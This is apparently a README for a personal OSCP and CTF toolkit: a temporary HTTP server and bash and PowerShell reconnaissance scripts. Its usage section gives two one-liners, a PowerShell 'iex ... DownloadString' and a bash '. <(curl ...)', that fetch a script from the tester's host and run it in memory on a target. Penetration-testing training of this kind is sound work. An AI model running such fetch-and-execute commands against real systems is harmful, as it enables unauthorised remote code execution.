# OSCP Aux Recon Tools

A small set of tools developed to tackle my OSCP, this set consists of:
Temporary HTTP server and reconnaissance scripts in bash and PowerShell, which work together to facilitate reconnaissance and logistics tasks during machine and CTF resolution.


## Usage

1. Run the http temp server
```bash
./httpTempServ.py
```

2. Load the script

For Windows
```c
iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/recon.ps1'))
```

For Linux
```c
. <(curl 10.10.10.10/recon.sh)
```

3. In the SHORTCUTS dictionary, you can add any aliases you need along with the file path to quickly access them from any directory when the web server is running.